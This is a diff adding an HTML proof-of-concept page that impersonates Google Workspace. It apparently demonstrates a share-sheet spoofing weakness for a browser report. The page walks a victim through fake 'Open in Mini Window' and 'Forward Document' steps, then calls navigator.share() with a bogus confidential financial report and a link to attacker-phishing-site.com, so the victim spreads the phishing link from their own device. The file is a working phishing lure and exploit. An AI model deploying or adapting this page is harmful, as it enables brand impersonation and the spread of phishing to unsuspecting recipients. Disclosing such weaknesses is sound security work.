@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Google Workspace - Share Document</title>
+    <style>
+        body {
+            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            max-width: 480px;
+            text-align: center;
+        }
+        .logo { width: 100px; margin-bottom: 20px; }
+        h2 { color: #202124; font-weight: 400; font-size: 24px; margin-bottom: 8px; }
+        p { color: #5f6368; line-height: 1.6; margin-bottom: 20px; font-size: 15px; }
+        .step { 
+            background: #f1f3f4; 
+            border-radius: 8px; 
+            padding: 15px; 
+            margin-bottom: 15px; 
+            text-align: left; 
+        }
+        .step-num { 
+            display: inline-block; 
+            background: #1a73e8; 
+            color: white; 
+            width: 24px; height: 24px; 
+            border-radius: 50%; 
+            text-align: center; 
+            line-height: 24px; 
+            font-size: 13px; 
+            font-weight: 600; 
+            margin-right: 8px; 
+        }
+        .btn-mini {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 500;
+            cursor: context-menu;
+            border: none;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        .btn-share {
+            background-color: #34a853;
+            color: white;
+            padding: 14px 32px;
+            border-radius: 4px;
+            text-decoration: none;
+            display: inline-block;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            font-size: 16px;
+            display: none;
+        }
+        .btn-share:hover { background-color: #2d8e47; }
+        #log {
+            margin-top: 20px;
+            padding: 15px;
+            background: #e8f5e9;
+            border: 1px solid #4caf50;
+            color: #1b5e20;
+            display: none;
+            text-align: left;
+            font-size: 13px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    <h2>Share Secure Document</h2>
+    <p>A colleague has shared a confidential document with you. Follow the steps below to forward it securely.</p>
+    
+    <div class="step">
+        <span class="step-num">1</span>
+        <span style="font-size:14px; color:#202124;">Right-click the button below and select <b>"Open in Mini Window"</b></span>
+    </div>
+
+    <a id="mini-trigger" class="btn-mini" href="https://docs.google.com">
+        Open Document Portal
+    </a>
+
+    <div class="step" id="step2" style="display:none;">
+        <span class="step-num">2</span>
+        <span style="font-size:14px; color:#202124;">Now click <b>"Forward Document"</b> to share via your device</span>
+    </div>
+
+    <button id="share-btn" class="btn-share">
+        Forward Document
+    </button>
+
+    <div id="log"></div>
+</div>
+
+<script>
+    const miniTrigger = document.getElementById('mini-trigger');
+    const shareBtn = document.getElementById('share-btn');
+    const step2 = document.getElementById('step2');
+    const log = document.getElementById('log');
+
+    // Step 1: Detect right-click on the Mini Window link
+    miniTrigger.addEventListener('contextmenu', () => {
+        console.log("[PoC] Right-click detected. Showing Step 2...");
+        
+        // After a brief delay, reveal the share button (Mini Window is now open)
+        setTimeout(() => {
+            step2.style.display = 'block';
+            shareBtn.style.display = 'inline-block';
+        }, 2000);
+    });
+
+    // Step 2: User clicks "Forward Document" — this is a FRESH user gesture
+    // navigator.share() is called DIRECTLY from click event = gesture token is VALID
+    shareBtn.addEventListener('click', async () => {
+        try {
+            await navigator.share({
+                title: 'Q4 Financial Report - CONFIDENTIAL',
+                text: 'URGENT: Review required before EOD. Open this document to approve the quarterly budget revision.',
+                url: 'https://attacker-phishing-site.com/fake-google-doc'
+            });
+
+            log.style.display = 'block';
+            log.innerHTML = `
+                <b>⚠️ SHARE SHEET HIJACKED</b><br><br>
+                <b>Impact:</b> The victim shared a malicious phishing link via their own device (Messages, Mail, AirDrop, etc).
+                The macOS Share Sheet displayed <b>zero origin information</b>.
+                Combined with the Google Docs Mini Window, the victim believed they were forwarding a legitimate document.
+                <br><br>
+                <b>Propagation:</b> The phishing link is now trusted by recipients because it was sent from the victim's personal device.
+            `;
+            console.log("[PoC] SUCCESS: Malicious link shared via native Share Sheet.");
+
+        } catch (err) {
+            log.style.display = 'block';
+            log.style.background = '#fff3cd';
+            log.style.borderColor = '#ffeeba';
+            log.style.color = '#856404';
+            log.innerHTML = `<b>Cancelled:</b> ${err.message}`;
+            console.log("[PoC] Share cancelled:", err.message);
+        }
+    });
+</script>
+
+</body>
+</html>
